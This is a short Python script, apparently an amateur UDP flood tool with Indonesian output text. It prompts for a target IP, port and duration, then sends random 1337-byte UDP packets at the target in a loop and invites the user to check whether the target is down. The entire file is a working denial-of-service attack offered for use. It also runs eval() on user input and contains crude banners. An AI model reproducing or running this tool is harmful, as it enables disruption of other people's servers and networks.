import sys
import os
import time
import socket
import random
from termcolor import colored
#Fvck
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1337)
#############
#Install Figlet
os.system("clear")
os.system("apt-get install -y figlet")
os.system("clear")
os.system("figlet FvckScrptKddieX")
os.system("figlet DVileX")
print()
print(colored("Author   : D'Vile", 'magenta'))
print(colored("FvckIngScrptKiddieX.", 'red'))
print()
ip = input("IP Target : ")
port = eval(input("Port       : "))
dur = input("Time: ")
timeout = time.time() + int(dur)
sent = 0
os.system("clear")
os.system("figlet Attack Starting")
print(colored("[                    ] 1% ",'blue'))
time.sleep(4.9)
print(colored("[=====               ] 25%", 'red'))
time.sleep(4.9)
print(colored("[==========          ] 50%",'magenta'))
time.sleep(4.9)
print(colored("[===============     ] 75%", 'yellow'))
time.sleep(4.9)
print(colored("[8================D-] 100%",'green'))
time.sleep(2.9)
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(colored("Menyelundupkan Packets VirusCorona , Coba cek Targtny apakh udh down.. we sent %s packets Di Target: %s" % (
            sent, ip), 'green'))
    except KeyboardInterrupt:
        sys.exit()
